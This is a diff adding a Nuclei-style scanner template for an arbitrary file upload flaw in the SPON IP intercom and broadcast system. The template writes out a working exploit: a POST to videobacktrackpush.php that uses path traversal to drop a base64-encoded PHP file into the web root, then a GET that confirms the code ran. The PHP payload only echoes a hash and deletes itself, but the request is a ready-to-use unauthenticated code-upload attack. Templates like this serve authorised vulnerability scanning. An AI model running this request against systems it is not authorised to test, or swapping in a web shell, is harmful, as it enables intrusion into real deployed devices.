@@ -1,0 +1,43 @@
+id: poc-yaml-spon-videobacktrackpush-anyfile-upload
+info:
+  name: "世邦通信SPON-IP网络对讲广播系统 videobacktrackpush 任意文件上传漏洞"
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+
+variables:
+  t1: "{{rand_int(1,10)}}"
+  t2: "{{md5(t1)}}"
+  payload: "{{base64(concat('<?php echo md5(' , t1 , ');unlink(__FILE__);'))}}"
+
+http:
+  - id: file-upload
+    method: POST
+    path:
+      - "{{BaseURL}}/php/videobacktrackpush.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      jsondata[caller]=1&jsondata[callee]=../../../../../../ICPAS/Wnmp/WWW&jsondata[videoname]={{t1}}_{{t1}}_{{t1}}.php&jsondata[videocontent]={{payload}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "\"res\":\"1\""
+          - "success"
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "{{BaseURL}}/{{t1}}_{{t1}}_{{t1}}.php"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{t2}}"
